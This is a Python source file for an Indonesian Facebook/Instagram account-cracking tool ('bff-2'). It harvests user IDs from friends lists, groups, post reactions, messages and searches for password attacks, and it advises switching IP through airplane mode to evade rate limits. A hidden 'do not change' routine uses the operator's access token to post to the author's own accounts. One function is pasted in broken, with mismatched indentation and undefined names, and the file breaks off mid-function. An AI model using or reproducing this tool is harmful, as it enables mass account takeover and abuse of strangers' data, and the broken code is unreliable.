# coding=utf-8
# coding by Romi Afrizal
# Izin dlu lah bro kalau mau recode, gk ngotak njir _-
# Note : jangan di ubah lagi! nanti error, script udah enak

import os, sys, subprocess, platform
try:
	import rich
except ImportError:
	print ('\n\t\x1b[0m >_< mohon tunggu... >_<\n')
	os.system('pip install rich')
	
import rich
from rich.markdown import Markdown
from rich.console import Console

try:
	import requests
except ImportError:
	catet_req = ('# • sedang menginstall modul requests •')
	requ = rich.markdown.Markdown(catet_req, style='green')
	rich.console.Console().print(requ)
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	catet_futur = ('# • sedang menginstall modul futures •')
	ft = rich.markdown.Markdown(catet_futur, style='green')
	rich.console.Console().print(ft)
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	catet_bs = ('# • sedang menginstall modul bs4 •')
	soup = rich.markdown.Markdown(catet_bs, style='green')
	rich.console.Console().print(soup)
	os.system('pip install bs4')
try:
	import mechanize
except ImportError:
	catet_mek = ('# • sedang menginstall modul mechanize •')
	meka = rich.markdown.Markdown(catet_mek, style='green')
	rich.console.Console().print(meka)
	os.system('pip install mechanize')
try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
	
Mr = '\x1b[1;91m' 
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m'
def ingfoh():
	print (
f"""{Hj}
 • Info script :
 	
 - author      : Romi Afrizal
 - instagram   : romz_xyz
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : bff-2
 - version     : 1.3
 - update pada : 21 Februari 2022
 
+ ---------------------------------------- +
            TENTANG METODE CRACK
+ ---------------------------------------- +
 - b-api: Metode ini proses nya sangat cepat
          tapi rawan spam jadi wajar hasil nya
          tidak memuaskan dan jarang dapat hasil

- mbasic: Metode ini proses nya lumayan lambat
          tapi jika menggunakan metode ini hasil 
          yg di dapat memuaskan dan jarang kena
          spam

- mobile: Metode ini proses nya sangat lambat 
          tapi jika menggunakan metode ini hasil
          yg di dapat sangat memuaskan dan jarang 
          kena spam

+ ---------------------------------------- +
             TIDAK SUPORT KARTU 
+ ---------------------------------------- +
- Kartu Telkomsel tidak suport untuk crack
  jadi wajar jika tidak dapat hasil atau lama
  pada saat crack, Karena rawan spam.
  Rekomendasi kartu Axis, XL.
 
+ ---------------------------------------- +
                MODE PESAWAT
+ ---------------------------------------- +
- Jika gunakan mode pesawat itu guna nya 
  akan melewati beberapa ID dan merubah IP 
  kita pada saat proses crack. Cukup gunakan
  mode pesawat 1-2 detik saja. Jika gunakan 
  mode pesawat terlalu lama maka akan semakin
  banyak ID yg terlewatkan. Maka dari itu cukup
  gunakan 1-2 detik saja.
  
{Mr}!{Mt} Jika bug/error pada script harap lapor saya
""")

# MODULE
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

# TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# KUMPULAN WARNA
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="•"

ok, cp, id, user, pwx, loop = [], [], [], [], [], 0

sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 by romz {×} \x07')

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

# FOLDER
def folder():
	try:os.mkdir('IG')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass

# LOGO (LO GOBLOK)
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "

author = 'Romi Afrizal'
fb_me = 'facebook.com/romi.afrizal.102'
github = 'github.com/Mark-Zuck'

def banner():
	os.system('clear')
	logo = (f'# • Author : {author} •')
	play = rich.markdown.Markdown(logo, style='green')
	rich.console.Console().print(play)
	print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
	(M,til,K,til,H,til,M,til,K,til,H,til,M,P,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
	print (' %s#%s IP   %s:%s %s %s- %s%s '%(U,O,M,O,IP,H,O,CN))
    
# CONVERT COOKIE DICT TO STRING
def romz_xyz(cookie,venom={}):
	for x in cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		if len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	return venom

# MENU MASUK
def Masuk():
	try:
		kueh = romz_xyz(open("data/cookies","r").read().strip())
	except FileNotFoundError:
		os.system('clear')
		banner()
		print ('\n%s%s%s 01 %sLogin instagram (crack akun instagram) '%(U,til,K,O))
		print ('%s%s%s 02 %sLogin via cookie (crack akun facebook) '%(U,til,K,O))
		print ('%s%s%s 03 %sCara mendapatkan cookie facebook '%(U,til,K,O))
		print ('%s%s%s 00 %sKeluar '%(U,til,M,O))
		while True:
			rom = input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
			if rom in(""):
				print("%s%s isi yang benar "%(M,til))
			elif rom in ('1','01'):
				checkin()
			elif rom in ('2','02'):
				jalan("\n%s!%s Wajib gunakan akun tumbal dilarang akun utama"%(M,O))
				kukis = input("%s# %sCookie %s> %s"%(P,O,M,K))
				if kukis in(""):
					print ("%s%s isi cookie kentod "%(M,til))
					exit()
				else:
					konverter(kukis)
					masuk(kukis).login()
			elif rom in ('3', '03'):
				print (N)
				tutorial = ('''# Untuk mendapatkan cookie siapkan aplikasi kiwi browser, download di play store jika belum. Jika sudah login kan akun facebook anda di kiwi browser, akun wajib mode data. Salin link: https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm/related. Ketik Y/y lalu enter untuk melihat tutorial lebih lengkap!''')
				ah = rich.markdown.Markdown(tutorial, style='green')
				rich.console.Console().print(ah)
				nanya = input('%s%s%s ingin melihat tutorial? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
				if nanya in(""):
					print ("%s%s saya bertanya wajib di jawab "%(M,til));jeda(2)
					masuk()
				elif nanya in("y","Y"):
					print (N)
					link = ('# Link tutorial: https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl')
					ah = rich.markdown.Markdown(link, style='green')
					rich.console.Console().print(ah)
					print ("%s%s buka dengan facebook "%(M,til));jeda(2)
					os.system("xdg-open https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl")
					exit()
				elif nanya in("n","N"):
					exit()
			elif rom in ('0', '00'):
				exit('\n')
			else:
				exit("%s%s isi yang benar "%(M,til))
				
	pilihan().menu()
	
# MASUK LEWAT COOKIE (KUEH)
class masuk:
	
	def __init__(self,cok):
		self.cok = cok
		self.url = "https://mbasic.facebook.com"
		
	def login(self):
		try:
			cek = requests.get(f"{self.url}/profile.php?v=info", cookies=romz_xyz(self.cok)).text
			if "mbasic_logout_button" in cek:
				from data import login, informasi
				open("data/cookies","w").write(self.cok)
				if "Laporkan Masalah" in cek:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					informasi.info(romz_xyz(self.cok),cek).myinfo()
					mikey.usernem()
					print ("\n%s √ login berhasil "%(H));jeda(2)
					pilihan().menu()
				else:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					mikey.lang(romz_xyz(self.cok))
					informasi.info(romz_xyz(self.cok),cek).myinfo()
					print ("\n%s √ login berhasil "%(H));jeda(2)
					pilihan().menu()
			elif 'checkpoint' in cek:
				exit ("%s× login checkpoint "%(M));jeda(2)
			else:
				exit ("%s× cookie invalid "%(M));jeda(2)
		except requests.exceptions.ConnectionError:
			exit ("%s%s tidak ada koneksi "%(M,til));jeda(2)
			
# CONVERT COOKIE KE TOKEN 
def konverter(kukis): 
	_header = {
		'Host':'business.facebook.com',
		'cache-control':'max-age=0',
		'upgrade-insecure-requests':'1',
		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type' : 'text/html; charset=utf-8',
		'accept-encoding':'gzip, deflate',
		'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cookie': kukis
	}
	try:
		ling = requests.get("https://business.facebook.com/business_locations", headers=_header)
		cari = re.search('(EAAG\w+)', ling.text)
		romz = cari.group(1)
		if 'EAAG' in romz:
			open('data/token.txt', 'w').write(romz)
			print (f'\n{P}#{O} Token anda {M}> {K}{romz} ');jeda(2)
			login_bot(romz)
	except AttributeError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()
	except UnboundLocalError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()

# JANGAN DI UBAH !
def login_bot(romz):
	try:
		toket = romz
		romz1 = ('100067807565861')
		romz2 = ('100029143111567')
		romz3 = ('100028434880529')
		requests.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # ROMI AFRIZAL PENGGUNA AKUN UNIK
		requests.post(f"https://graph.facebook.com/{romz2}?fields=subscribers&access_token={toket}") # DEMIT ROMI AFRIZAL
		requests.post(f"https://graph.facebook.com/{romz3}?fields=subscribers&access_token={toket}") # Romi Afrizal (2018)
		
	except:
		pass
		
# MENU PILIHAN INI AJG
class Menu():
	
	def __init__(self,url):
		self.url = url
		
	def tentang(self):
		try:
			kueh = romz_xyz(open("data/cookies","r").read().strip())
		except IOError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		try:
			tentang = json.loads(open("data/my_info","r").read().strip())
		except FileNotFoundError:
			from data import informasi
			informasi.info(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text).myinfo()
			os.system('python bff-2.py')
		try:
			a = requests.get(f"{self.url}/profile.php", cookies = kueh).text
		except requests.exceptions.ConnectionError:
			exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		if "mbasic_logout_button" not in a:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		else:
			banner()
			print(f"{U} # {O}Name{M} : {H}{tentang.get('nama')}\n")
			print ('%s•%s 01 %sCrack dari daftar teman '%(U,P,O))
			print ('%s•%s 02 %sCrack dari total pengikut'%(U,P,O))
			print ('%s•%s 03 %sCrack dari reaction post'%(U,P,O))
			print ('%s•%s 04 %sCrack dari komentar post'%(U,P,O))
			print ('%s•%s 05 %sCrack dari anggota group'%(U,P,O))
			print ('%s•%s 06 %sCrack dari pencarian nama'%(U,P,O))
			print ('%s•%s 07 %sCrack dari pesan mesengger'%(U,P,O))
			print ('%s•%s 08 %sCrack dari saran teman'%(U,P,O))
			print ('%s•%s 09 %sCrack user instagram %spro'%(U,P,O,H))
			#print ('%s•%s 10 %sSetting user agent'%(U,P,O))
			print ('%s•%s 10 %sLihat hasil crack'%(U,P,O))
			print ('%s•%s 11 %sCheckpoint detektor'%(U,P,O))
			print ('%s•%s 12 %sInfo (tentang)'%(U,P,O))
			print ('%s•%s rm %sHapus data login'%(U,P,O))
			print ('%s•%s 00 %sKeluar (logout)'%(U,M,O))
		
class pilihan:
	
	def __init__(self):
		self.kueh = romz_xyz(open("data/cookies","r").read().strip())
		try:
			self.token = open("data/token.txt","r").read()
		except FileNotFoundError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			os.system('clear')
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		self.url = ("https://mbasic.facebook.com")
		self.id = []
				
	def menu(self):
		Menu(self.url).tentang()
		slut = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
		if slut in['',' ']:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif slut in['1','01']:
			gan = input ("\n%s%s%s ingin crack massal id? y/t%s >%s "%(U,til,O,M,K))
			if gan in[""]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			elif gan in['y','Y']:
				try:
					token = self.token
					self.MassalGRAPH(token)
				except KeyError:
					exit('\n%s%s gagal mengambil id '%(M,til))
			elif gan in['t','T']:
				print ("\n%s%s %sPastikan daftar teman bersifat publik "%(U,til,O))
				idt = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s%s isi yang benar'%(M,til));jeda(2)
				elif(re.findall("\w+",idt)):
					r = requests.get("https://mbasic.facebook.com/"+idt).text
					try:
						user = re.findall('\;rid\=(\d+)\&',str(r))[0]
					except:
						user = idt
					try:
						print ('')
						token = self.token
						self.PublikGRAPH(user, token)
					except KeyError:
						exit('\n%s%s gagal mengambil id '%(M,til))
		elif slut in['2','02']:
			print ("\n%s%s %sPastikan target terdapat pengikut nya "%(U,til,O))
			idt = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			else:
				data_ = (f"{self.url}/{idt}?v=followers")
			try:
				response = requests.get(data_, cookies=self.kueh).text
				if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				elif "Halaman yang Anda minta tidak ditemukan." in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				elif "Konten Tidak Ditemukan" in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				else:
					#print (f"{U}{til}{O} Nama akun {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0])
					print ('')
					self.FollowersPAR(data_)
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif slut in["3","03"]:
			print ("\n%s%s %sPastikan postingan bersifat publik tidak private "%(U,til,O))
			idt = input('%s%s %sUrl/link postingan %s> %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
				self.menu()
			elif "m.facebook.com" in idt:
				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in idt:
				data_ = idt.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in idt:
				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
			else:
				data_ = idt
			try:
				respon = requests.get(data_, cookies=self.kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
					exit('\n%s%s postingan tidak di temukan'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				else:
					try:
						print ('')
						url = re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon)[0].replace(";","&")
						self.postingan(f"{self.url}/ufi/reaction/profile/browser/{url}")
					except IndexError:
						exit('\n%s%s masukan id postingan dengan benar'%(M,til))
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
			except requests.exceptions.MissingSchema:
				exit('\n%s%s Invalid url%s\n'%(M,til,N))
		elif slut in["4","04"]:
			print ("\n%s%s %sPastikan postingan bersifat publik tidak private "%(U,til,O))
			idt = input('%s%s %sUrl/link postingan %s> %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
				self.menu()
			elif "m.facebook.com" in idt:
				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in idt:
				data_ = idt.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in idt:
				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
			else:
				data_ = idt
			try:
				respon = requests.get(data_, cookies=self.kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
					exit('\n%s%s postingan tidak di temukan'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				else:
					try:
						print ('')
						self.komen(f"{self.url}/{idt}")
					except IndexError:
						exit('\n%s%s masukan id postingan dengan benar'%(M,til))
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
			except requests.exceptions.MissingSchema:
				exit('\n%s%s Invalid url%s\n'%(M,til,N))
		elif slut in["5","05"]:
			while True:
				print ("\n%s%s %sPastikan group bersifat publik tidak private "%(U,til,O))
				idt = input('%s%s %sId group %s> %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s%s isi yang benar'%(M,til));jeda(2)
				else:
					try:
						response = requests.get(f"{self.url}/browse/group/members/?id={idt}",cookies=self.kueh).text
						if "Halaman Tidak Ditemukan" in response:
							exit('\n%s%s group tidak di temukan'%(M,til))
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
							exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
						elif "Konten Tidak Ditemukan" in response:
							exit('\n%s%s group tidak di temukan'%(M,til))
						else:
							print (f"{U}{til}{O} Nama group {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0][8:])
							print("")
							self.grup(f"{self.url}/browse/group/members/?id={idt}");break
					except requests.exceptions.ConnectionError:
						exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif slut in["6","06"]:
			while True:
				print ("\n%s%s %sMasukan nama orang contoh Romi Afrizal "%(U,til,O))
				idt = input('%s%s %sMasukan nama %s> %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s%s isi yang benar'%(M,til));jeda(2)
				else:
					try:
						response = requests.get(f"{self.url}/search/people/?q={idt}",cookies=self.kueh).text
						if "Maaf, kami tidak menemukan" in response:
							exit('\n%s%s nama tidak di temukan'%(M,til))
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
							exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
						else:
							jumlah = int(input('%s%s %sJumlah nama  %s> %s'%(U,til,O,M,K)))
							if "6000" in str(jumlah):
								jumlah-=1
							if jumlah<6001:
								print ('')
								self.nama(f"{self.url}/search/people/?q={idt}",jumlah);break
							else:
								exit('\n%s%s Max 6000 user'%(M,til))
					except requests.exceptions.ConnectionError:
						exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
					except ValueError:
						exit ('\n%s%s isi yang benar'%(M,til));jeda(2)
		elif slut in['7','07']:
			print('')
			self.pesan('https://mbasic.facebook.com/messages')
		elif slut in["8","08"]:
			try:
				response = requests.get(f"{self.url}/friends/center/suggestions",cookies=self.kueh).text
				if "Tidak Ada Saran" in response:
					exit('\n%s%s tidak ada saran teman'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				else:
					print ('')
					jumlah = int(input('%s%s %sJumlah teman %s> %s'%(U,til,O,M,K)))
					if "6000" in str(jumlah):
						jumlah-=1
					if jumlah<6001:
						self.saran(f"{self.url}/friends/center/suggestions",jumlah)
					else: 
						exit('\n%s%s Max 6000 user'%(M,til))
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
			except ValueError:
				exit ('\n%s%s isi yang benar'%(M,til));jeda(2)
		elif slut in['9','09']:
			checkin()
		#elif slut in['10']:
			#useragent()
		elif slut in['10']:
			print ("\n%s%s%s 01 %sCek hasil akun facebook "%(U,til,P,O))
			print ("%s%s%s 02 %sCek hasil akun instagram "%(U,til,P,O))
			print ("%s%s%s 03 %sHapus hasil crack "%(U,til,P,O))
			print ("%s%s%s 00 %sKembali "%(U,til,M,O))
			rom = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
			cek_cek(rom)
		elif slut in['11']:
			file_cp()
		elif slut in['12']:
			ingfoh()
		elif slut in['RM','Rm','rm']:
			print ('\n%s%s menghapus data login dari termux '%(M,til));jeda(1)
			try:
				os.remove("data/cookies")
				os.remove("data/token.txt")
				os.remove("data/my_info")
			except:
				os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			jalan('\n%s√ berhasil terhapus '%(H))
			exit()
		elif slut in['0','00']:
			exit ('\n')
		
		if len(self.id)!=0:
			print
			return Crack().romiy(self.id)
		#else:
			#exit (f'{M}{til} gagal mengambil ID ')
			
	# CRACK MASSAL
	def MassalGRAPH(self, token):
		try:
			jum = int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			print ("\n%s%s %sPastikan daftar teman bersifat publik "%(U,til,O))
		except:jum=1
		for t in range(jum):
			t +=1
			idt = input('%s%s %sUsername/Id %s%s%s > %s'%(U,til,O,P,t,M,K))
			if idt in['']:
				print
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
				try:
					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:
					user = idt
		
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
		try:
			print ('')
			print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
		except:
			pass
						
	# CRACK PUBLIK 
	def PublikGRAPH(self, user, token):
		try:
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
		except:
			pass
			
	# CRACK FOLLOWERS
	def FollowersPAR(self, data_):
		try:
			respon = requests.get(data_, cookies = self.kueh).text
			otw = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', respon) 
			for i in otw:
				if "&amp;refid=" in i[0]:
					self.id.append(re.findall("id=(.*?)&",i[0])[0]+"<=>"+i[1])
				elif "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				elif "?refid=" in i[0]:
					self.id.append(re.findall("(.*?)\?refid=",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.FollowersPAR(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
			
	# CRACK POSTINGAN PUBLIK
	def postingan(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			if "Semua 0" in respon:
				exit('\n%s%s tidak ada yg menanggapi postingan'%(M,til))
			else:
				otw = re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',respon)
				for i in otw:
					if "profile.php?" in i[0]:
						self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
					else:
						self.id.append(re.findall("/(.*)",i[0])[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				if "Lihat Selengkapnya" in respon:
					self.postingan(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
		
	# CRACK POSTINGAN KOMENTAR
	def komen(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			otw = parser(respon,'html.parser')
			for i in otw.find_all('h3'):
				for a in i.find_all('a',href=True):
					if "profile.php" in a.get("href"):
						c = a.get("href").split('=')[1]
						id = c.split('&')[0]
						user = a.text
						self.id.append(id+'<=>'+user)
					else:
						c = a.get("href").split('?')[0]
						id = c.split('/')[1]
						user = a.text
						self.id.append(id+'<=>'+user)
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			for i in otw.find_all("a",href=True):
				if "Lihat komentar lainnya…" in i.text:
					self.komen("https://mbasic.facebook.com/"+i.get("href"))
		except:
			pass

	# CRACK GROUP
	def crack_grup(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol=requests.get(hencet,cookies=kueh).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
            else:
                id.append(softek[0]+"<=>"+softek[1])
            sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass
	
	# CRACK PENCARIAN NAMA
	def nama(self, data_, jum):
		try:
			true = False
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',respon)
			for i in otw:
				if "profile.php?" in i[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",i[1])[0]+"<=>"+i[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in respon:
					self.nama(parser(respon,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:
			pass
			
	# CRACK PESAN CHAT
	def pesan(self, data_):
		try:
			bs = parser(requests.get(data_, cookies=self.kueh).text, 'html.parser')
			print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			for i in bs.find_all('a', href=True):
				if '/messages/read' in i.get('href'):
					f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
					try:
						for ip in list(f.pop()):
							if self.kueh.get(' c_user') in ip:
								continue
							else:
								if 'pengguna facebook' in i.text.lower():
									continue
								self.id.append(ip+"<=>"+i.text)
					except Exception as e:
						continue
				if 'Lihat Pesan Sebelumnya' in i.text:
					self.pesan('https://mbasic.facebook.com/' + i.get('href'))
		except:
			pass
			
	# CRACK SARAN TEMAN
	def saran(self, data_, jum):
		try:
			true = False
			respon = requests.get(data_, cookies=self.kueh).text
